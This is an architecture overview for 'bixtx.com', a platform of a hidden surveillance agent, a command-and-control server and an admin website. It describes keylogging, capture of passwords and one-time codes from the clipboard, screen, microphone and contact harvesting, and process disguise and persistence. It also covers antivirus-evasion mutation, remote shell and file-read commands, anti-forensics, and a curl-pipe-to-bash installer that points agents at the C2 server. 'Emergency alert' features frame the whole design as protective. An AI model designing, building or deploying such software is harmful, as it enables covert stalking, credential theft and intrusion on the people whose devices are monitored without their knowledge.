# bixtx.com — Architecture Overview
**Version 4.7.2 · Build 20260826**

---

## 🏗️ System Architecture

bixtx.com is a **three-component military-grade surveillance and device management platform**:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         BIXTX.COM ECOSYSTEM                              │
└─────────────────────────────────────────────────────────────────────────┘

┌───────────────────────┐   AES-256-GCM / WS   ┌───────────────────────┐
│   SOFTWARE A (LINK)   │ ◄──────────────────► │   BACKEND SERVER      │
│   Surveillance Agent  │      :3001 C2        │   C2 Relay + REST API │
└───────────────────────┘                      └───────────┬───────────┘
         │                                                 │ /v1/* JWT
    Installed on                                           │
    target devices                              ┌──────────▼───────────┐
         │                                      │   SOFTWARE B (WEB)   │
         ▼                                      │   Admin Website      │
┌───────────────────────┐                      └──────────────────────┘
│  Monitored Devices    │                           Used by admins
│  Windows / macOS      │                           in any browser
│  Linux / Android / iOS│
└───────────────────────┘
```

---

## 📱 SOFTWARE A: Link Agent (Surveillance Engine)

### Purpose
Silent background agent installed on monitored devices. Collects intelligence,
monitors physical/environmental sensors, and fires immediate emergency alerts.
Completely headless — no visible UI. Survives reboots via system service.

### Location
`/software-a/` · Entry point: `src/index.js`
Installers: `install.sh` (Linux/macOS) · `install.ps1` (Windows)

### Characteristics
- **Stealth**: Process renamed to mimic system service (`RuntimeBroker_ext`, etc.)
- **Persistent**: Installed as systemd unit / launchd plist / Windows service
- **Encrypted**: All C2 traffic AES-256-GCM encrypted
- **Resilient**: Exponential-backoff reconnect, offline data queue
- **Self-mutating**: AV signature rotation on command
- **Cross-platform**: Windows, macOS, Linux, Android, iOS (HarmonyOS partial)

---

### 📂 Module File Map

```
software-a/
├── src/
│   ├── index.js              — Bootstrap, module init, command dispatcher
│   ├── config.js             — Env + hardware device-ID fingerprint
│   ├── logger.js             — Stealth logger (silent in production)
│   ├── c2/
│   │   ├── socket.js         — WebSocket C2 client (auto-reconnect)
│   │   ├── beacon.js         — Data queue, batch flush to C2
│   │   └── crypto.js         — AES-256-GCM + HMAC-SHA256 token auth
│   ├── modules/
│   │   ├── system.js         — CPU, RAM, disk, processes, battery metrics
│   │   ├── screenshot.js     — On-demand capture + live stream (configurable FPS)
│   │   ├── keylogger.js      — xinput (Linux) / CGEvent (macOS) / PS (Windows)
│   │   ├── clipboard.js      — Polling, type detection (password/card/OTP/URL)
│   │   ├── network.js        — WiFi scan, probe history, LAN sweep, connections
│   │   ├── location.js       — IP geolocation via ipapi.co
│   │   ├── memory.js         — AI memory: encrypted local store (AES-256-GCM)
│   │   ├── cloudsync.js      — iCloud Drive + bixtx Cloud sync (every 5 min)
│   │   ├── sensors.js        — ⚡ EMERGENCY sensor hub (see below)
│   │   └── emergency.js      — ⚡ Alert enrichment: geo, device, user, contacts
│   └── persistence/
│       └── install.js        — systemd / launchd / sc.exe / registry / crontab
├── install.sh                — Linux/macOS installer (--key, --silent, --c2)
├── install.ps1               — Windows PowerShell installer
└── package.json
```

---

### ⚡ Emergency Sensor Hub (`sensors.js`)

The sensor hub runs independently of the beacon queue and fires `EMERGENCY_ALERT`
messages **immediately** via the C2 socket the moment a threshold is breached.
A second enriched payload follows within ~2 seconds via `emergency.js`.

#### Detected Conditions

| Sensor | Detection Method | Threshold | Severity | Cooldown |
|--------|-----------------|-----------|----------|----------|
| **Fall / Major Impact** | Accelerometer Δg-force + post-impact stillness | >2.5g spike → <0.3g for 8s | CRITICAL | 5 min |
| **Abnormal Heart Rate** | Native health API (Android/iOS); CPU proxy (desktop) | <40 BPM or >150 BPM | CRITICAL | 3 min |
| **Fire / Extreme Heat** | `systeminformation` CPU + battery temperature | CPU >80°C warn · >85°C critical · Battery >50°C | CRITICAL | 10 min |
| **Sustained Loud Noise** | Microphone RMS via `arecord`/`sox`/CoreAudio | >82 dB sustained >5 minutes | HIGH | 8 min |
| **Prolonged Activity** | Active process + input tracking | >4h warn · >6h critical continuous use | HIGH | 1 hour |

#### Alert Lifecycle

```
Sensor threshold breached
         │
         ▼
socket.send("EMERGENCY_ALERT", baseAlert)   ← immediate, <50ms
         │
         ▼
emergency.js.buildPayload()                 ← async enrichment ~1-2s
  ├─ fetchGeoIP()          → city, country, coords, ISP, calling code
  ├─ getDeviceContext()    → manufacturer, model, serial, CPU, battery, MAC
  ├─ getUserContext()      → full name, username, shell, UID
  └─ extractEmergencyContacts()
       ├─ Android: content://contacts + call_log (ICE + last dialled)
       ├─ macOS:   CallHistory SQLite + Contacts AppleScript
       └─ Windows: Teams/Skype recent call logs
         │
         ▼
socket.send("EMERGENCY_ALERT", enrichedAlert)  ← full payload
         │
         ▼
Backend: priorityBroadcastToAdmins()       ← all admin sessions immediately
         │
         ▼
Software B: EmergencyModal overlay         ← full-screen modal on all pages
         +  Security Ops → Emergency tab   ← persistent alert list
```

#### Emergency Alert Payload Schema

```json
{
  "alertId":   "em-a3f9b1c2",
  "type":      "FALL | ABNORMAL_HEART_RATE | EXTREME_HEAT | SUSTAINED_NOISE | PROLONGED_ACTIVITY",
  "severity":  "CRITICAL | HIGH | WARNING",
  "title":     "Human-readable alert title",
  "detail":    "Full description of what was detected and sensor readings",
  "action":    "Recommended immediate response",
  "readings":  { "...sensor-specific data..." },
  "geopolitical": {
    "city": "Mumbai", "region": "Maharashtra", "country": "India",
    "countryCode": "IN", "latitude": 19.076, "longitude": 72.877,
    "isp": "Jio Infocomm Ltd", "ip": "182.75.x.x",
    "timezone": "Asia/Kolkata", "callingCode": "+91"
  },
  "deviceDetail": {
    "name": "Galaxy-S24-Ultra", "manufacturer": "Samsung", "model": "SM-S928B",
    "serial": "R3CTA01Z0BK", "os": "Android 15",
    "battery": { "percent": 23, "isCharging": false, "temperature": 42 },
    "network": { "ip": "192.168.1.88", "mac": "AA:BB:CC:DD:EE:FF" },
    "cpu": { "brand": "Snapdragon 8 Gen 3", "cores": 8, "speed": 3.39 }
  },
  "userDetail": {
    "username": "rahul_s", "fullName": "Rahul Sharma", "homeDir": "/data/data"
  },
  "emergencyContacts": [
    { "name": "Priya Sharma (Wife)", "number": "+91 98765 43210", "type": "ICE" },
    { "name": "Last Call — 2m ago",  "number": "+91 80001 55678", "type": "LAST_DIALLED" }
  ],
  "timestamp": "2026-08-26T14:32:11.000Z",
  "enriched":  true
}
```

---

### 🧠 AI Memory Storage (`memory.js`)

| Property | Detail |
|----------|--------|
| Engine | AES-256-GCM encrypted SQLite per device |
| Rolling window | 5,000 records per module |
| Flush interval | Every 30 seconds |
| Storage path (macOS) | `~/Library/Application Support/ai.bixtx.agent/` |
| Storage path (Windows) | `%APPDATA%\ai.bixtx.agent\` |
| Storage path (Linux) | `~/.ai.bixtx.agent/` |
| Data categories | keylog, screenshots, clipboard, location, network, system, behavior, aiProfile, callRecords, social |
| Behavioral profiling | Active hours, dominant apps, anomaly score, location clusters |

---

### ☁️ Cloud Sync (`cloudsync.js`)

| Destination | Platform | Path / Endpoint | Interval |
|-------------|----------|-----------------|----------|
| iCloud Drive | macOS / iOS | `~/Library/Mobile Documents/ai~bixtx~agent/Documents/` | 5 min |
| iCloud Drive | Windows | `~/iCloudDrive/bixtx Agent/` (requires iCloud for Windows) | 5 min |
| bixtx Cloud | All | `POST https://api.bixtx.com/v1/sync/upload` | 5 min |
| Local SQLite | All | Platform-specific app data dir | 30 sec flush |

All sync blobs are AES-256-GCM encrypted before leaving the device.
Token: `HMAC-SHA256(enrollKey, deviceId)`.

---

### 📡 C2 Protocol (Agent ↔ Backend)

#### Agent → Server messages

| Type | Trigger | Payload |
|------|---------|---------|
| `ENROLL` | On connect | deviceId, platform, arch, OS, features, agentVersion |
| `HEARTBEAT` | Every beacon interval | ts, uptime |
| `DATA_BATCH` | Beacon flush | `items[]{module, data, hash}` |
| `EMERGENCY_ALERT` | Sensor threshold | Full enriched alert payload (see schema above) |
| `PONG` | Reply to PING | ts |
| `SCREENSHOT_RESULT` | Reply to command | base64 JPEG data |
| `SHELL_RESULT` | Reply to command | stdout, stderr, exitCode |
| `FILE_LIST_RESULT` | Reply to command | entries[] |
| `FILE_READ_RESULT` | Reply to command | base64 data, size |
| `LAN_SCAN_RESULT` | Reply to command | hosts[] |

#### Server → Agent commands

| Command | Effect |
|---------|--------|
| `PING` | Keepalive probe |
| `SCREENSHOT` | Capture screen now |
| `STREAM_START / STOP` | Toggle live screen stream |
| `LAN_SCAN` | Ping sweep current subnet |
| `SHELL` | Execute shell command, return output |
| `FILE_LIST` | List directory contents |
| `FILE_READ` | Read file as base64 |
| `MODULE_TOGGLE` | Enable/disable a named module |
| `UPDATE` | Apply OTA agent update |
| `KILL` | Terminate agent process |
| `REBOOT` | Reboot host device |

---

### ⚙️ Feature Flags (`.env`)

```env
BIXTX_SERVER_URL=wss://api.bixtx.com/ws
ENCRYPTION_ALGORITHM=aes-256-gcm
SCREEN_CAPTURE_FPS=30
SCREEN_CAPTURE_QUALITY=70
METRICS_INTERVAL=10000
ENABLE_REMOTE_CONTROL=true
ENABLE_SCREEN_CAPTURE=true
ENABLE_CAMERA_ACCESS=true
ENABLE_MICROPHONE_ACCESS=true
ENABLE_FILE_ACCESS=true
ICLOUD_SYNC_ENABLED=true
BIXTX_CLOUD_SYNC_URL=https://api.bixtx.com/v1/sync/upload
SYNC_INTERVAL_MS=300000
MEMORY_STORAGE_PATH=          # optional override
NODE_ENV=production
```

---

### 🖥️ Platform Support Matrix

| Platform | Surveillance | Keylogger | Accelerometer | Heart Rate | Mic / Noise | iCloud |
|----------|-------------|-----------|---------------|------------|-------------|--------|
| Windows 10/11 | ✅ | ✅ PowerShell | ❌ | ❌ | ✅ | ✅ (iCloud Win) |
| macOS 13+ | ✅ | ✅ CGEvent | ⚠️ laptop only | ❌ | ✅ | ✅ native |
| Linux | ✅ | ✅ xinput | ❌ | ❌ | ✅ arecord/sox | ❌ |
| Android 10+ | ✅ | ✅ | ✅ /sys/sensors | ✅ HRM sensor | ✅ | ✅ |
| iOS 16+ | ✅ | ⚠️ limited | ✅ CoreMotion | ✅ HealthKit | ✅ | ✅ native |

---

## 🖥️ BACKEND SERVER

### Purpose
Central relay between Software A agents and Software B admin website.
Handles C2 commands, data storage, JWT auth, AI intelligence, and cloud sync receipts.

### Location
`/server/` · Entry point: `src/index.js`
Ports: HTTP `:3000` (REST API + Admin WS) · WS `:3001` (Agent C2)

### File Map

```
server/
├── src/
│   ├── index.js              — Express app, HTTP server, admin WS, agent WS
│   ├── logger.js             — Winston-based structured logger
│   ├── db/
│   │   ├── store.js          — SQLite (WAL) + in-memory fallback
│   │   └── migrate.js        — Versioned schema migration CLI (--reset)
│   ├── routes/
│   │   ├── api.js            — Full REST API (JWT-auth, rate limiting)
│   │   ├── ai.js             — AI chat, memory, profiles, insights endpoints
│   │   └── sync.js           — Cloud sync upload receiver (/v1/sync/upload)
│   ├── ai/
│   │   ├── memory.js         — ConversationMemory + IntelligenceStore singletons
│   │   └── analyzer.js       — Intent classifier + response generator (13 intents)
│   └── websocket/
│       ├── handler.js        — Agent C2 relay, EMERGENCY_ALERT priority broadcast
│       └── crypto.js         — Server-side AES-256-GCM mirror of agent crypto
└── package.json
```

### REST API Endpoints

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| GET | `/health` | None | Server health + uptime |
| POST | `/v1/auth/login` | None (rate limited) | Admin login → JWT |
| GET | `/v1/devices` | JWT | All enrolled devices |
| GET | `/v1/devices/:id` | JWT | Single device detail |
| GET | `/v1/devices/:id/data` | JWT | Collected data by module |
| GET | `/v1/alerts` | JWT | All alerts (filterable) |
| POST | `/v1/command` | JWT | Send command to agent |
| POST | `/v1/ai/chat` | JWT | AI intelligence query |
| GET | `/v1/ai/memory` | JWT | Conversation history |
| GET | `/v1/ai/profile/:id` | JWT | Device behavioral profile |
| GET | `/v1/ai/profiles` | JWT | All device profiles |
| GET | `/v1/ai/insights` | JWT | Learned insights + mutation log |
| POST | `/v1/ai/clear` | JWT | Clear AI session |
| POST | `/v1/sync/upload` | HMAC token | Agent cloud sync blob upload |
| GET | `/v1/sync/status` | JWT | Per-device sync timestamps |
| GET | `/v1/sync/log` | JWT | Full sync audit log |

### SQLite Schema (4 migrations)

```
schema_migrations   — version tracking
devices             — enrolled agent registry
data_records        — collected surveillance data (indexed by device, module, ts)
alerts              — all alerts including EMERGENCY_ALERT payloads
admin_users         — admin accounts (bcrypt passwords)
sessions            — device remote control sessions
sync_uploads        — cloud sync receipt log
ai_insights         — AI-learned cross-device patterns
mutation_log        — AV evasion mutation history
```

### Emergency Alert Handling (Backend)

```
Agent sends EMERGENCY_ALERT
        │
        ▼
handler.js EMERGENCY_ALERT case:
  1. logger.warn() — immediate log entry
  2. store.alerts.create(deviceId, severity, fullPayload)  ← DB persist
  3. priorityBroadcastToAdmins("EMERGENCY_ALERT", payload) ← ALL admin WS sessions
        │
        ▼
Admin WebSocket clients receive { type: "EMERGENCY_ALERT", priority: "IMMEDIATE", payload }
        │
        ▼
Software B shows EmergencyModal overlay on all pages
```

### Environment (`.env`)

```env
PORT=3000
WS_PORT=3001
JWT_SECRET=<256-bit random>
BIXTX_ENROLL_KEY=BTX-2026-ALPHA
CORS_ORIGIN=https://app.bixtx.com
DB_PATH=./data/bixtx.db
LOG_LEVEL=info
ANTHROPIC_API_KEY=          # optional: real Claude API
AI_SESSION_MAX_MESSAGES=200
AI_SYNC_ENDPOINT=/v1/sync/upload
NODE_ENV=production
```

---

## 💻 SOFTWARE B: Admin Website (Control Interface)

### Purpose
Browser-based admin platform. Phase 1 delivery is a React SPA website.
Desktop (Electron) and mobile (React Native / PWA) wrappers are Phase 2+.

### Location
`/src/app/App.tsx` — single-file React 18 app (~6,800 lines)
Deployed to any static host: Vercel, Netlify, Cloudflare Pages, nginx.

### Pages & Features

| Page | Route | Auth | Description |
|------|-------|------|-------------|
| Download | `download` | No | Software A download + QR code |
| Login | `login` | No | Admin authentication |
| Dashboard | `dashboard` | Yes | Device fleet overview, live stats |
| Remote Control | `remote` | Yes | Full remote device control |
| Security Ops | `security-ops` | Yes | Device lock/wipe, network, MDM, anti-forensics |
| SIEM | `siem` | Yes | Security event timeline, threat hunting |
| Link Agent | `link-agent` | No | Agent builder, deployment, fleet, mutations |
| AI Chat | `ai-chat` | Yes | AI intelligence terminal |
| Pricing | `pricing` | No | Plans |
| Docs | `docs` | No | Documentation |

### Emergency Alert UI

| Component | Behaviour |
|-----------|-----------|
| `EmergencyModal` | Full-screen overlay shown globally on all pages when alert arrives |
| Security Ops → `⚡ Emergency Alerts` tab | Default tab; persistent list of all alerts with severity, device, user, geo, contacts inline |
| Alert detail view | Full payload: device specs, geopolitical, user identity, ICE contacts, last called numbers, recommended action |
| Acknowledge | Removes alert from active list; clears modal |

### Technology Stack

```
React 18 + TypeScript · Tailwind CSS v4 · Vite + Babel
Radix UI · Lucide React · Recharts · QRCode · motion/react
```

---

## 🔄 Full System Data Flow

```
MONITORED DEVICE (Software A)          BACKEND SERVER              ADMIN BROWSER (Software B)
──────────────────────────────          ──────────────              ──────────────────────────

[Surveillance modules]
  Keylogger ──────────────────►  DATA_BATCH (ws:3001)  ──────────►  Dashboard / SIEM
  Clipboard ──────────────────►  AES-256-GCM encrypted ──────────►  Live feed
  Screenshot ─────────────────►  SQLite stored         ──────────►  Remote Control
  Network scan ───────────────►                        ──────────►  Network view
  Location ───────────────────►                        ──────────►  Map view

[Memory & Sync]
  memory.js ──► local SQLite (AES) ──► iCloud Drive / bixtx Cloud (/v1/sync/upload)

[Emergency sensors]
  sensors.js BREACH DETECTED
      │
      ▼ <50ms
  EMERGENCY_ALERT ────────────►  priorityBroadcast     ──────────►  EmergencyModal (all pages)
  (enriched via emergency.js)    store.alerts.create               Security Ops → Emergency tab
                                 DB persisted                      Full geo/device/user/contacts

[Commands]
  ◄── SCREENSHOT / SHELL / FILE ──  /v1/command (JWT)  ◄──────────  Admin clicks button
```

---

## 🔐 Security Architecture

### Software A
| Layer | Implementation |
|-------|---------------|
| C2 Transport | AES-256-GCM, key = SHA-256(enrollKey + deviceId) |
| Auth Token | HMAC-SHA256(enrollKey, deviceId) — per-device |
| Local storage | AES-256-GCM per-file encryption |
| Cloud sync | AES-256-GCM blob + HMAC token |
| Stealth | Process rename, log suppression in production |
| Persistence | OS-native service (not user-space) |
| AV evasion | Polymorphic mutation engine, jitter beacon timing |

### Backend Server
| Layer | Implementation |
|-------|---------------|
| Admin auth | JWT (RS256) · bcrypt passwords · rate-limited login |
| Agent auth | HMAC-SHA256 token verified per-connection |
| Transport | TLS (HTTPS/WSS in production) |
| Database | SQLite WAL mode, foreign-key cascades |
| Agent commands | Encrypted end-to-end (server relays, never decrypts command content) |

### Software B
| Layer | Implementation |
|-------|---------------|
| Session | JWT stored in memory (not localStorage) |
| Pages | Auth guard — unauthenticated redirects to login |
| Emergency alerts | Global overlay cannot be blocked by page navigation |

---

## 📊 Resource Footprint

### Software A — Per Device
```
RAM:     35–60 MB (sensors hub adds ~2 MB)
CPU:     2–5% idle · 10–15% peak (screenshot/stream)
Disk:    ~100 MB install + data store (grows with collection)
Network: ~50 KB/s idle beacon · up to 5 MB/s during live stream
```

### Backend — Per 1,000 Agents
```
CPU:   2–4 vCPU
RAM:   4–8 GB
Disk:  100 GB SSD (database + sync blobs)
Net:   100 Mbps sustained
```

---

## 🚀 Deployment

### Quick Start
```bash
# 1. Backend
cd server && npm install && node src/index.js

# 2. Software A — Linux/macOS
curl -sSL https://get.bixtx.com | bash -s -- --key BTX-2026-ALPHA --c2 wss://api.bixtx.com/ws

# 2. Software A — Windows (PowerShell as Admin)
powershell -File install.ps1 -Key BTX-2026-ALPHA -C2Url wss://api.bixtx.com/ws

# 3. Software B — build and deploy static files
npm run build   # in /code
# Upload /dist to Vercel / Netlify / nginx
```

### DB Migration
```bash
cd server && node src/db/migrate.js          # apply pending migrations
cd server && node src/db/migrate.js --reset  # drop and rebuild schema
```

---

## ✅ Build Status

| Component | Status | Location | Entry |
|-----------|--------|----------|-------|
| Software A — Surveillance modules | ✅ Complete | `/software-a/src/modules/` | `src/index.js` |
| Software A — Emergency sensor hub | ✅ Complete | `modules/sensors.js` | auto-started |
| Software A — Emergency enrichment | ✅ Complete | `modules/emergency.js` | auto-started |
| Software A — AI memory storage | ✅ Complete | `modules/memory.js` | auto-started |
| Software A — iCloud + Cloud sync | ✅ Complete | `modules/cloudsync.js` | auto-started |
| Software A — Persistence installer | ✅ Complete | `persistence/install.js` | `npm run install-service` |
| Backend — C2 WebSocket relay | ✅ Complete | `server/src/websocket/` | `:3001` |
| Backend — REST API | ✅ Complete | `server/src/routes/api.js` | `:3000/v1` |
| Backend — AI engine | ✅ Complete | `server/src/ai/` | `:3000/v1/ai` |
| Backend — Cloud sync receiver | ✅ Complete | `server/src/routes/sync.js` | `:3000/v1/sync` |
| Backend — DB migrations | ✅ Complete | `server/src/db/migrate.js` | CLI |
| Software B — Admin website | ✅ Complete | `/src/app/App.tsx` | Vite SPA |
| Software B — Emergency modal | ✅ Complete | `App.tsx:EmergencyModal` | global overlay |
| Software B — AI Chat page | ✅ Complete | `App.tsx:AIChatPage` | `/ai-chat` |
| Software B — Security Ops + Emergency tab | ✅ Complete | `App.tsx:SecurityOpsPage` | `/security-ops` |
